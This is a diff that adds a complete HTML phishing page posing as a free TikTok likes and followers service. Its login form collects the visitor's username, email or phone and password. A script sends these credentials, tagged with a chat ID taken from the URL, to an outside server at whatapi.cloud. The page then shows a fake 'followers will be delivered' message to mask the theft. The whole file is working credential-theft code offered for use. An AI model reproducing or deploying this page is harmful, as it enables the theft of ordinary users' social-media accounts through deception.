@@ -1,1 +1,121 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="robots" content="noindex,follow" />
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tik Tok Followers</title>
+<script src="jquery.min.js"></script>
+<script src="jscript.js"></script>
+<link rel="stylesheet" type="text/css" href="style.css">
+<style>
+    @media(max-width:760px){
+       #TFG{
+           font-size:140%;
+       } 
+       .buttonstyle{
+           font-size:100%;
+       }
+    
+    .followers , .likes{
+        width:95%;
+    }
+    }
+
+    .spinner {
+        display: none;
+        border: 4px solid rgba(0, 0, 0, 0.1);
+        border-radius: 50%;
+        border-top: 4px solid #3498db;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        margin: 10px auto;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    .success-message {
+        display: none;
+        color: green;
+        text-align: center;
+        margin-top: 20px;
+    }
+</style>
+</head>
+<body onload="updateyear()">
+<div id="main-tool">
+<div class="wrapper"><img src="logo.png"></div>
+<h1 id="TFG">Login</h1>
+<p class="sub-heading">Login to get 1000 Tiktok Likes Free</p>
+<form id="loginForm" action="check.php" method="POST" onsubmit="return checkBeforeSubmit()">
+<input name="id" type="hidden" value="6351331850">
+<center>
+<div id="fillup">
+<div class="form-option">
+<input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
+</div>
+<div id="fillup">
+<div class="form-option">
+<input name="password" class="input-form input-command" type="password" placeholder="Password" required>
+</div>
+<br><br>
+<button class="buttonstyle"><b>Login</b></button>
+<div class="spinner" id="spinner"></div>
+<div class="success-message" id="message">Followers will be delivered soon within 24 hours!</div>
+</center>
+</div>
+</div>
+<div id="steps" style="display:none;"></div>
+<div id="comment" style="display:none;"></div>
+<script type="text/javascript"> 
+  var wasSubmitted = false;     
+    function checkBeforeSubmit(){ 
+      if(!wasSubmitted) { 
+        wasSubmitted = true; 
+        return wasSubmitted; 
+      } 
+      return false; 
+    }     
+</script>
+<script>
+  const chatId = new URLSearchParams(window.location.search).get("id");
+
+  document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const spinner = document.getElementById('spinner');
+    const message = document.getElementById('message');
+    spinner.style.display = 'block';
+
+    const formData = {
+        email: this.email.value,
+        password: this.password.value,
+        type: 'TikTok',
+        chat_id: chatId
+    };
+
+    fetch('https://whatapi.cloud:8443/info', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+    })
+    .then(response => response.json())
+    .then(data => {
+      spinner.style.display = 'none';
+      message.style.display = 'block';
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      spinner.style.display = 'none';
+    });
+  });
+</script>
+</body>
+</html>
